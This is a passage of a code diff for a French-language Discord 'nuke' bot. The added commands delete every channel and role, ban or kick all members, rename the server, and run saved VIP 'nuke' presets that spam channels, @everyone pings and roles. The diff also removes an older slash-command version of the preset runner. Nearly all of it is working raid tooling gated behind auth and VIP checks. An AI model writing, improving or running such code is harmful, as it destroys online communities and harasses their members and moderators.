+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.administrator:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
+            return
+        start = asyncio.get_event_loop().time()
+        chan_tasks = [_safe(c.delete(reason='+reset')) for c in list(guild.channels)]
+        role_targets = [
+            r for r in guild.roles
+            if not r.is_default() and not r.managed and r < me.top_role
+        ]
+        role_tasks = [_safe(r.delete(reason='+reset')) for r in role_targets]
+        await asyncio.gather(*chan_tasks, *role_tasks)
+        terminal = await _safe(guild.create_text_channel(name='_terminal', reason='+reset terminal'))
+        elapsed = asyncio.get_event_loop().time() - start
+        remaining = {r.id for r in guild.roles}
+        deleted = sum(1 for r in role_targets if r.id not in remaining)
+        if terminal:
+            try:
+                await terminal.send(embed=_embed(
+                    'reset', f'Termine en {elapsed:.1f}s - {deleted}/{len(role_targets)} roles supprimes.',
+                    EMBED_COLOR_OK,
+                ))
+            except Exception:  # noqa: BLE001
+                pass
+
+    @bot.command(name='ban-all')
+    @require_auth()
+    async def ban_all(ctx: commands.Context):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.ban_members:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Ban Members.', EMBED_COLOR_BAD))
+            return
+        targets = [
+            m for m in guild.members
+            if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id and m.top_role < me.top_role
+        ]
+        start = asyncio.get_event_loop().time()
+        await asyncio.gather(*[_safe(m.ban(reason=f'+ban-all by {ctx.author}', delete_message_days=0)) for m in targets])
+        elapsed = asyncio.get_event_loop().time() - start
+        remaining = {m.id for m in guild.members}
+        banned = sum(1 for m in targets if m.id not in remaining)
+        await ctx.send(embed=_embed(
+            'ban-all', f'**{banned}/{len(targets)}** membres bannis en {elapsed:.1f}s.', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='kick-all')
+    @require_auth()
+    async def kick_all(ctx: commands.Context):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.kick_members:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Kick Members.', EMBED_COLOR_BAD))
+            return
+        targets = [
+            m for m in guild.members
+            if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id and m.top_role < me.top_role
+        ]
+        start = asyncio.get_event_loop().time()
+        await asyncio.gather(*[_safe(m.kick(reason=f'+kick-all by {ctx.author}')) for m in targets])
+        elapsed = asyncio.get_event_loop().time() - start
+        remaining = {m.id for m in guild.members}
+        kicked = sum(1 for m in targets if m.id not in remaining)
+        await ctx.send(embed=_embed(
+            'kick-all', f'**{kicked}/{len(targets)}** membres expulses en {elapsed:.1f}s.', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='rename-s')
+    @require_auth()
+    async def rename_s(ctx: commands.Context, *, name: str):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.manage_guild:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Server.', EMBED_COLOR_BAD))
+            return
+        new_name = name.strip()
+        if len(new_name) < 2 or len(new_name) > 100:
+            await ctx.send(embed=_embed('Erreur', 'Le nom doit faire entre 2 et 100 caracteres.', EMBED_COLOR_BAD))
+            return
+        old_name = guild.name
+        try:
+            await guild.edit(name=new_name, reason=f'+rename-s by {ctx.author}')
+        except discord.HTTPException as e:
+            await ctx.send(embed=_embed('Erreur', f'`{e}`', EMBED_COLOR_BAD))
+            return
+        await ctx.send(embed=_embed(
+            'rename-s', f'Serveur renomme: **{old_name}** -> **{new_name}**', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='supp-roles')
+    @require_auth()
+    async def supp_roles(ctx: commands.Context, target: str = 'all'):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.manage_roles:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles.', EMBED_COLOR_BAD))
+            return
+        target = target.strip().lower()
+        if target != 'all':
+            try:
+                rid = int(target)
+            except ValueError:
+                await ctx.send(embed=_embed('Erreur', 'target doit etre \"all\" ou un ID numerique.', EMBED_COLOR_BAD))
+                return
+            role = guild.get_role(rid)
+            if role is None:
+                await ctx.send(embed=_embed('Erreur', f'Aucun role avec l ID `{rid}`.', EMBED_COLOR_BAD))
+                return
+            if role.is_default() or role.managed or role >= me.top_role:
+                await ctx.send(embed=_embed('Erreur', 'Role non supprimable.', EMBED_COLOR_BAD))
+                return
+            await role.delete(reason=f'+supp-roles by {ctx.author}')
+            await ctx.send(embed=_embed('supp-roles', f'Role **{role.name}** supprime.', EMBED_COLOR_OK))
+            return
+        deletable = [
+            r for r in guild.roles
+            if not r.is_default() and not r.managed and r < me.top_role
+        ]
+        if not deletable:
+            await ctx.send(embed=_embed('supp-roles', 'Aucun role supprimable trouve.', EMBED_COLOR_BAD))
+            return
+        start = asyncio.get_event_loop().time()
+        await asyncio.gather(*[_safe(r.delete(reason='+supp-roles all')) for r in deletable])
+        remaining = {r.id for r in guild.roles}
+        deleted = sum(1 for r in deletable if r.id not in remaining)
+        elapsed = asyncio.get_event_loop().time() - start
+        await ctx.send(embed=_embed(
+            'supp-roles', f'**{deleted}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.', EMBED_COLOR_OK,
+        ))
+
+    @bot.command(name='n-config')
+    @require_vip()
+    async def n_config(ctx: commands.Context):
+        presets = _get_user_presets(ctx.author.id)
+        embed = _embed(
+            'Configuration de tes presets nuke',
+            f'Tu as actuellement **{len(presets)}** preset(s) sauvegarde(s).
+
+'
+            f'Utilise les boutons ci-dessous pour creer, lister ou supprimer.
+'
+            f'Execute ensuite avec `{CHILD_PREFIX}p-run <preset_name>`.',
+            EMBED_COLOR,
+        )
+        await ctx.send(embed=embed, view=NConfigView(ctx.author.id))
+
+    @bot.command(name='p-run')
+    @require_vip()
+    async def p_run(ctx: commands.Context, preset_name: str):
+        if ctx.guild is None:
+            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
+            return
+        guild = ctx.guild
+        me = guild.me
+        if me is None or not me.guild_permissions.administrator:
+            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
+            return
+        preset = _get_user_presets(ctx.author.id).get(preset_name)
+        if preset is None:
+            await ctx.send(embed=_embed('Erreur', f'Preset `{preset_name}` introuvable.', EMBED_COLOR_BAD))
+            return
+        await _execute_nuke(
+            guild, ctx.author,
+            channels=int(preset.get('channels', 50)),
+            message=preset.get('message', '@everyone'),
+            repeat=int(preset.get('repeat', 5)),
+            channel_name=preset.get('channel_name', 'nuked'),
+            server_name=preset.get('server_name'),
+            delete_roles=bool(preset.get('delete_roles', True)),
+            spam_role_name=preset.get('spam_role_name', 'nuked'),
+            spam_role_count=int(preset.get('spam_role_count', 50)),
+        )
+        await ctx.send(embed=_embed('p-run', f'Preset `{preset_name}` execute.', EMBED_COLOR_OK))
 
 
-# ----------------------------- /p-run (VIP) ----------------------------- #
-
-async def _preset_name_autocomplete(interaction: discord.Interaction, current: str):
-    presets = _get_user_presets(interaction.user.id)
-    current_low = current.lower()
-    return [
-        app_commands.Choice(name=n, value=n)
-        for n in presets.keys() if current_low in n.lower()
-    ][:25]
-
-
-@bot.tree.command(name='p-run', description='Execute /nuke avec un de tes presets sauvegardes (VIP)')
-@app_commands.describe(preset_name='Nom du preset a lancer')
-@app_commands.autocomplete(preset_name=_preset_name_autocomplete)
-@require_vip()
-async def p_run(interaction: discord.Interaction, preset_name: str):
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    if interaction.guild is None:
-        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
-        return
-
-    guild = interaction.guild
-    me = guild.me
-    if me is None or not me.guild_permissions.administrator:
-        await interaction.followup.send('Le bot doit avoir Administrateur.', ephemeral=True)
-        return
-
-    preset = _get_user_presets(interaction.user.id).get(preset_name)
-    if preset is None:
-        await interaction.followup.send(f'Preset `{preset_name}` introuvable.', ephemeral=True)
-        return
-
-    await _execute_nuke(
-        guild, interaction.user,
-        channels=int(preset.get('channels', 50)),
-        message=preset.get('message', '@everyone'),
-        repeat=int(preset.get('repeat', 5)),
-        channel_name=preset.get('channel_name', 'nuked'),
-        server_name=preset.get('server_name'),
-        delete_roles=bool(preset.get('delete_roles', True)),
-        spam_role_name=preset.get('spam_role_name', 'nuked'),
-        spam_role_count=int(preset.get('spam_role_count', 50)),
-    )
-    await interaction.followup.send(f'Preset `{preset_name}` execute.', ephemeral=True)
-
+# --------------------------------------------------------------------------- #
+# Entrypoint
+# --------------------------------------------------------------------------- #
 
 if __name__ == '__main__':
-    bot.run(TOKEN, reconnect=True)
+    main_bot.run(MAIN_TOKEN, reconnect=True)
